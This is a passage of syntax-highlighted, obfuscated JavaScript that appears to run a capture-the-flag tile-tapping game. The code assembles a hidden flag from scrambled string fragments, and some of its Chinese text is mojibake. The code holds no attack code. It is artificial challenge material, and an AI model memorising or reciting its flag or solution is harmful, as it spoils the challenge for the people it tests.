class="string">&#x27;concat&#x27;</span>](_0x2ecb48[<span class="string">&#x27;slice&#x27;</span>](<span class="number">0x0</span>));<span class="keyword">var</span> _0x28ed54=_0x5438[_0x2ecb48];<span class="keyword">if</span>(_0x1d2e[<span class="string">&#x27;kzcnsq&#x27;</span>]===<span class="literal">undefined</span>)&#123;(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x555d4e=<span class="keyword">typeof</span> <span class="variable language_">window</span>!==<span class="string">&#x27;undefined&#x27;</span>?<span class="attr">window</span>:<span class="keyword">typeof</span> process===<span class="string">&#x27;object&#x27;</span>&amp;&amp;<span class="keyword">typeof</span> <span class="built_in">require</span>===<span class="string">&#x27;function&#x27;</span>&amp;&amp;<span class="keyword">typeof</span> <span class="variable language_">global</span>===<span class="string">&#x27;object&#x27;</span>?<span class="attr">global</span>:<span class="variable language_">this</span>;<span class="keyword">var</span> _0x58cd15=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;_0x555d4e[<span class="string">&#x27;atob&#x27;</span>]||(_0x555d4e[<span class="string">&#x27;atob&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x4aea15</span>)&#123;<span class="keyword">var</span> _0x11308f=<span class="title class_">String</span>(_0x4aea15)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>,<span class="string">&#x27;&#x27;</span>);<span class="keyword">for</span>(<span class="keyword">var</span> _0x2431ae=<span class="number">0x0</span>,_0x400573,_0x4ebd7c,_0x46df95=<span class="number">0x0</span>,_0x291d35=<span class="string">&#x27;&#x27;</span>;_0x4ebd7c=_0x11308f[<span class="string">&#x27;charAt&#x27;</span>](_0x46df95++);~_0x4ebd7c&amp;&amp;(_0x400573=_0x2431ae%<span class="number">0x4</span>?_0x400573*<span class="number">0x40</span>+<span class="attr">_0x4ebd7c</span>:_0x4ebd7c,_0x2431ae++%<span class="number">0x4</span>)?_0x291d35+=<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span>&amp;_0x400573&gt;&gt;(-<span class="number">0x2</span>*_0x2431ae&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;_0x4ebd7c=_0x58cd15[<span class="string">&#x27;indexOf&#x27;</span>](_0x4ebd7c);&#125;<span class="keyword">return</span> _0x291d35;&#125;);&#125;());_0x1d2e[<span class="string">&#x27;wFtflA&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x252547</span>)&#123;<span class="keyword">var</span> _0x266165=<span class="title function_">atob</span>(_0x252547);<span class="keyword">var</span> _0x5ac6ea=[];<span class="keyword">for</span>(<span class="keyword">var</span> _0x50bcd0=<span class="number">0x0</span>,_0xcf4f7b=_0x266165[<span class="string">&#x27;length&#x27;</span>];_0x50bcd0&lt;_0xcf4f7b;_0x50bcd0++)&#123;_0x5ac6ea+=<span class="string">&#x27;%&#x27;</span>+(<span class="string">&#x27;00&#x27;</span>+_0x266165[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x50bcd0)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(_0x5ac6ea);&#125;;_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>]=&#123;&#125;;_0x1d2e[<span class="string">&#x27;kzcnsq&#x27;</span>]=!![];&#125;<span class="keyword">var</span> _0x192bd6=_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>][_0x2ecb48];<span class="keyword">if</span>(_0x192bd6===<span class="literal">undefined</span>)&#123;_0x28ed54=_0x1d2e[<span class="string">&#x27;wFtflA&#x27;</span>](_0x28ed54);_0x1d2e[<span class="string">&#x27;fyRGZk&#x27;</span>][_0x2ecb48]=_0x28ed54;&#125;<span class="keyword">else</span>&#123;_0x28ed54=_0x192bd6;&#125;<span class="keyword">return</span> _0x28ed54;&#125;;<span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">_0x4c27d2</span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;0&#x27;</span>)](_0x4c27d2);&#125;<span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">_0x1e165d</span>)&#123;<span class="keyword">var</span> _0x5a88c5=&#123;<span class="string">&#x27;PLhSs&#x27;</span>:<span class="string">&#x27;div&#x27;</span>&#125;;<span class="keyword">var</span> _0x138beb=<span class="variable language_">document</span>[<span class="string">&#x27;createElement&#x27;</span>](_0x5a88c5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1&#x27;</span>)]);_0x138beb[<span class="string">&#x27;className&#x27;</span>]=_0x1e165d;<span class="keyword">return</span> _0x138beb;&#125;<span class="keyword">var</span> clock=<span class="literal">null</span>;<span class="keyword">var</span> state=<span class="number">0x0</span>;<span class="keyword">var</span> speed=<span class="number">0x6</span>;<span class="keyword">var</span> result=![];<span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;!&#125;&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3&#x27;</span>),<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4&#x27;</span>),<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5&#x27;</span>),<span class="string">&#x27;sne&#x27;</span>];<span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x2a2153=&#123;<span class="string">&#x27;LZcUK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x36db61</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x36db61</span>();&#125;,<span class="string">&#x27;lfIrK&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6&#x27;</span>)&#125;;<span class="keyword">if</span>(!result)&#123;_0x2a2153[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;7&#x27;</span>)](init);&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(_0x2a2153[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;8&#x27;</span>)]);&#125;&#125;<span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x595dcc=&#123;<span class="string">&#x27;WsMwk&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;9&#x27;</span>),<span class="string">&#x27;kjhTg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x401487,_0x55dd27</span>)&#123;<span class="keyword">return</span> _0x401487||_0x55dd27;&#125;,<span class="string">&#x27;uPxpa&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xe37034,_0x1f9e25</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xe37034</span>(_0x1f9e25);&#125;,<span class="string">&#x27;oPXhX&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2f18f4</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x2f18f4</span>();&#125;,<span class="string">&#x27;CtPrC&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xab3c78,_0x4ce2df</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xab3c78</span>(_0x4ce2df);&#125;,<span class="string">&#x27;zwuFo&#x27;</span>:<span class="string">&#x27;move()&#x27;</span>&#125;;result=!![];<span class="keyword">for</span>(<span class="keyword">var</span> _0x340b33=<span class="number">0x0</span>;_0x340b33&lt;<span class="number">0x4</span>;_0x340b33++)&#123;_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;a&#x27;</span>)](createrow);&#125;_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;b&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;c&#x27;</span>))[<span class="string">&#x27;onclick&#x27;</span>]=<span class="keyword">function</span>(<span class="params">_0x5abac5</span>)&#123;<span class="keyword">if</span>(_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;d&#x27;</span>)]!==_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;d&#x27;</span>)])&#123;<span class="title function_">alert</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6&#x27;</span>));&#125;<span class="keyword">else</span>&#123;_0x5abac5=_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;e&#x27;</span>)](_0x5abac5,event);_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;f&#x27;</span>)](judge,_0x5abac5);&#125;&#125;;clock=<span class="variable language_">window</span>[<span class="string">&#x27;setInterval&#x27;</span>](_0x595dcc[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;10&#x27;</span>)],<span class="number">0x1e</span>);&#125;<span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xc9cc6=&#123;<span class="string">&#x27;Cutfg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3de745,_0x54f7ec</span>)&#123;<span class="keyword">return</span> _0x3de745+_0x54f7ec;&#125;,<span class="string">&#x27;HgDLT&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x1e2bf0,_0x10e0fe</span>)&#123;<span class="keyword">return</span> _0x1e2bf0+_0x10e0fe;&#125;,<span class="string">&#x27;UQPRM&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x433c7f,_0x43ecdf</span>)&#123;<span class="keyword">return</span> _0x433c7f+_0x43ecdf;&#125;&#125;;flag=_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;11&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;12&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;12&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;13&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;13&#x27;</span>)](flag[<span class="number">0x8</span>],flag[<span class="number">0x6</span>])+flag[<span class="number">0x1</span>],flag[<span class="number">0x7</span>])+flag[<span class="number">0x5</span>],flag[<span class="number">0x2</span>])+flag[<span class="number">0x0</span>],flag[<span class="number">0x4</span>]),flag[<span class="number">0x3</span>]);&#125;<span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x2280df=&#123;<span class="string">&#x27;mMirY&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3306f1</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3306f1</span>();&#125;,<span class="string">&#x27;Trirl&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;14&#x27;</span>),<span class="string">&#x27;jTrWv&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;c&#x27;</span>),<span class="string">&#x27;nZzwC&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3cfeea</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3cfeea</span>();&#125;,<span class="string">&#x27;YAIYI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xf36d5d,_0x1ccb30</span>)&#123;<span class="keyword">return</span> _0xf36d5d||_0x1ccb30;&#125;,<span class="string">&#x27;EkFcm&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;15&#x27;</span>),<span class="string">&#x27;BUnIs&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x330693,_0x4f4547</span>)&#123;<span class="keyword">return</span> _0x330693==_0x4f4547;&#125;,<span class="string">&#x27;blIGg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3daa21,_0x3b06f5</span>)&#123;<span class="keyword">return</span> _0x3daa21!==_0x3b06f5;&#125;,<span class="string">&#x27;pLYcs&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;16&#x27;</span>),<span class="string">&#x27;WmHSk&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;17&#x27;</span>),<span class="string">&#x27;LdBOh&#x27;</span>:<span class="string">&#x27;pNxjJ&#x27;</span>&#125;;<span class="keyword">var</span> _0x3b3385=$(<span class="string">&#x27;con&#x27;</span>);<span class="keyword">var</span> _0x5afcef=<span class="title function_">creatediv</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;18&#x27;</span>)]);<span class="keyword">var</span> _0xf09bdd=<span class="title function_">createcell</span>();_0x3b3385[<span class="string">&#x27;appendChild&#x27;</span>](_0x5afcef);<span class="keyword">for</span>(<span class="keyword">var</span> _0xa4a713=<span class="number">0x0</span>;_0xa4a713&lt;<span class="number">0x4</span>;_0xa4a713++)&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;19&#x27;</span>)===<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;19&#x27;</span>))&#123;_0x5afcef[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1a&#x27;</span>)](<span class="title function_">creatediv</span>(_0xf09bdd[_0xa4a713]));&#125;<span class="keyword">else</span>&#123;_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1b&#x27;</span>)](init);&#125;&#125;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1c&#x27;</span>)](_0x3b3385[<span class="string">&#x27;firstChild&#x27;</span>],<span class="literal">null</span>))&#123;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1d&#x27;</span>)](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;16&#x27;</span>),_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1e&#x27;</span>)]))&#123;ev[<span class="string">&#x27;target&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass1&#x27;</span>]=<span class="number">0x1</span>;&#125;<span class="keyword">else</span>&#123;_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1a&#x27;</span>)](_0x5afcef);&#125;&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;20&#x27;</span>)],_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;21&#x27;</span>)]))&#123;_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;22&#x27;</span>)](_0x5afcef,_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;23&#x27;</span>)]);&#125;<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x492bb8=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;24&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>),_0x356832=<span class="number">0x0</span>;<span class="keyword">while</span>(!![])&#123;<span class="keyword">switch</span>(_0x492bb8[_0x356832++])&#123;<span class="keyword">case</span><span class="string">&#x27;0&#x27;</span>:result=!![];<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;1&#x27;</span>:clock=<span class="variable language_">window</span>[<span class="string">&#x27;setInterval&#x27;</span>](_0x2280df[<span class="string">&#x27;Trirl&#x27;</span>],<span class="number">0x1e</span>);<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;2&#x27;</span>:$(_0x2280df[<span class="string">&#x27;jTrWv&#x27;</span>])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;25&#x27;</span>)]=<span class="keyword">function</span>(<span class="params">_0x41a97a</span>)&#123;_0x41a97a=_0x1b6288[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;26&#x27;</span>)](_0x41a97a,event);<span class="title function_">judge</span>(_0x41a97a);&#125;;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;3&#x27;</span>:<span class="keyword">for</span>(<span class="keyword">var</span> _0x3c3b91=<span class="number">0x0</span>;_0x3c3b91&lt;<span class="number">0x4</span>;_0x3c3b91++)&#123;_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;27&#x27;</span>)](createrow);&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;4&#x27;</span>:<span class="keyword">var</span> _0x1b6288=&#123;<span class="string">&#x27;MOzPj&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5adec6,_0x8e2f0b</span>)&#123;<span class="keyword">return</span> _0x2280df[<span class="string">&#x27;YAIYI&#x27;</span>](_0x5adec6,_0x8e2f0b);&#125;&#125;;<span class="keyword">continue</span>;&#125;<span class="keyword">break</span>;&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xea83af=&#123;<span class="string">&#x27;XGzyl&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xec6fe5,_0x4e0795</span>)&#123;<span class="keyword">return</span> _0xec6fe5==_0x4e0795;&#125;,<span class="string">&#x27;TBqmT&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x442e1a</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x442e1a</span>();&#125;,<span class="string">&#x27;wCkoL&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2d3224,_0x34b7d6</span>)&#123;<span class="keyword">return</span> _0x2d3224==_0x34b7d6;&#125;,<span class="string">&#x27;lniar&#x27;</span>:<span class="string">&#x27;WeIGh&#x27;</span>&#125;;<span class="keyword">var</span> _0x13b8d4=$(<span class="string">&#x27;con&#x27;</span>);<span class="keyword">if</span>(_0xea83af[<span class="string">&#x27;wCkoL&#x27;</span>](_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;28&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)],<span class="number">0x6</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2a&#x27;</span>)===_0xea83af[<span class="string">&#x27;lniar&#x27;</span>])&#123;_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2b&#x27;</span>)](_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2c&#x27;</span>)]);&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0xea83af[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2d&#x27;</span>)](rows[i][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2e&#x27;</span>)],<span class="number">0x1</span>))&#123;_0xea83af[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2f&#x27;</span>)](fail);&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">createcell</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xdb917a=&#123;<span class="string">&#x27;prkYr&#x27;</span>:<span class="string">&#x27;cell&#x27;</span>&#125;;<span class="keyword">var</span> _0x350dc0=[<span class="string">&#x27;cell&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),_0xdb917a[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;31&#x27;</span>)],_0xdb917a[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;31&#x27;</span>)]];<span class="keyword">var</span> _0x143001=<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;32&#x27;</span>)](<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;33&#x27;</span>)]()*<span class="number">0x4</span>);_0x350dc0[_0x143001]=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;34&#x27;</span>);<span class="keyword">return</span> _0x350dc0;&#125;<span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x50dc93=&#123;<span class="string">&#x27;pvEAg&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="string">&#x27;kclIZ&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;34&#x27;</span>),<span class="string">&#x27;kKiZZ&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>),<span class="string">&#x27;TfNvb&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x24d967,_0x2d20a7</span>)&#123;<span class="keyword">return</span> _0x24d967&gt;_0x2d20a7;&#125;,<span class="string">&#x27;ExruN&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x20928b,_0x223fd3</span>)&#123;<span class="keyword">return</span> _0x20928b==_0x223fd3;&#125;,<span class="string">&#x27;CPgjs&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3d1bb4</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3d1bb4</span>();&#125;&#125;;<span class="keyword">var</span> _0x7d254e=$(_0x50dc93[<span class="string">&#x27;kKiZZ&#x27;</span>]);<span class="keyword">var</span> _0xcb4af7=<span class="built_in">parseInt</span>(<span class="variable language_">window</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;36&#x27;</span>)](_0x7d254e,<span class="literal">null</span>)[<span class="string">&#x27;top&#x27;</span>]);<span class="keyword">if</span>(_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;37&#x27;</span>)](speed+_0xcb4af7,<span class="number">0x0</span>))&#123;_0xcb4af7=<span class="number">0x0</span>;&#125;<span class="keyword">else</span>&#123;_0xcb4af7+=speed;&#125;_0x7d254e[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=_0xcb4af7+<span class="string">&#x27;px&#x27;</span>;<span class="title function_">over</span>();<span class="keyword">if</span>(_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3a&#x27;</span>)](_0xcb4af7,<span class="number">0x0</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3b&#x27;</span>)!==<span class="string">&#x27;YeXSy&#x27;</span>)&#123;<span class="keyword">var</span> _0x4b2784=[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),_0x50dc93[<span class="string">&#x27;pvEAg&#x27;</span>],<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>)];<span class="keyword">var</span> _0x357234=<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;32&#x27;</span>)](<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;33&#x27;</span>)]()*<span class="number">0x4</span>);_0x4b2784[_0x357234]=_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3c&#x27;</span>)];<span class="keyword">return</span> _0x4b2784;&#125;<span class="keyword">else</span>&#123;_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3d&#x27;</span>)](createrow);_0x7d254e[<span class="string">&#x27;style&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3e&#x27;</span>);_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3d&#x27;</span>)](delrow);&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>)&#123;speed+=<span class="number">0x2</span>;<span class="keyword">if</span>(speed==<span class="number">0x14</span>)&#123;<span class="title function_">alert</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3f&#x27;</span>));&#125;&#125;<span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x9d37d9=&#123;<span class="string">&#x27;eLFjJ&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5cc88e,_0x3b4f5a</span>)&#123;<span class="keyword">return</span> _0x5cc88e!==_0x3b4f5a;&#125;,<span class="string">&#x27;JhtJI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2330d8</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x2330d8</span>();&#125;,<span class="string">&#x27;kPnGu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x506701,_0x733825</span>)&#123;<span class="keyword">return</span> _0x506701&lt;_0x733825;&#125;,<span class="string">&#x27;TSXCa&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x31e405,_0x14dd83</span>)&#123;<span class="keyword">return</span> _0x31e405==_0x14dd83;&#125;&#125;;<span class="keyword">var</span> _0x5d88ab=con[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;28&#x27;</span>)];<span class="keyword">if</span>(_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]==<span class="number">0x5</span>&amp;&amp;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;40&#x27;</span>)](_0x5d88ab[_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]-<span class="number">0x1</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;41&#x27;</span>)],<span class="number">0x1</span>))&#123;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;42&#x27;</span>)](fail);&#125;<span class="keyword">for</span>(<span class="keyword">let</span> _0x2f89b3=<span class="number">0x0</span>;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;43&#x27;</span>)](_0x2f89b3,_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]);_0x2f89b3++)&#123;<span class="keyword">if</span>(_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;44&#x27;</span>)](_0x5d88ab[_0x2f89b3][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2e&#x27;</span>)],<span class="number">0x1</span>))&#123;_0x9d37d9[<span class="string">&#x27;JhtJI&#x27;</span>](fail);&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x14c114=&#123;<span class="string">&#x27;soqNf&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3480b3,_0xd21da1</span>)&#123;<span class="keyword">return</span> _0x3480b3+_0xd21da1;&#125;,<span class="string">&#x27;txdzn&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x246811,_0x259a7c</span>)&#123;<span class="keyword">return</span> _0x246811+_0x259a7c;&#125;,<span class="string">&#x27;XdUQK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x42192d,_0x315028</span>)&#123;<span class="keyword">return</span> _0x42192d+_0x315028;&#125;,<span class="string">&#x27;EyUGz&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xe56318,_0x14eeae</span>)&#123;<span class="keyword">return</span> _0xe56318+_0x14eeae;&#125;,<span class="string">&#x27;iOJjI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x11f4cd</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x11f4cd</span>();&#125;,<span class="string">&#x27;vfoqn&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2c1a60,_0x34e3b5</span>)&#123;<span class="keyword">return</span> _0x2c1a60&gt;_0x34e3b5;&#125;,<span class="string">&#x27;MQTqg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x25788a,_0x13078a</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x25788a</span>(_0x13078a);&#125;,<span class="string">&#x27;sbqYu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4e2d7b,_0x25fda1</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4e2d7b</span>(_0x25fda1);&#125;,<span class="string">&#x27;eWVDT&#x27;</span>:<span class="string">&#x27;浣犵殑鏈€缁堝緱鍒哱x20&#x27;</span>,<span class="string">&#x27;OcpRn&#x27;</span>:<span class="string">&#x27;\x20\x20\x20浣犵殑flag涓�&#x27;</span>,<span class="string">&#x27;aAXDM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;45&#x27;</span>),<span class="string">&#x27;ynrUN&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4f2806,_0x5042d9</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4f2806</span>(_0x5042d9);&#125;,<span class="string">&#x27;XUebr&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x38dd19,_0x2d65d2</span>)&#123;<span class="keyword">return</span> _0x38dd19+_0x2d65d2;&#125;,<span class="string">&#x27;hdcqM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>),<span class="string">&#x27;rbpXR&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;47&#x27;</span>),<span class="string">&#x27;tPTze&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;48&#x27;</span>)&#125;;<span class="built_in">clearInterval</span>(clock);result=![];_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;49&#x27;</span>)](check_action);<span class="keyword">if</span>(_0x14c114[<span class="title 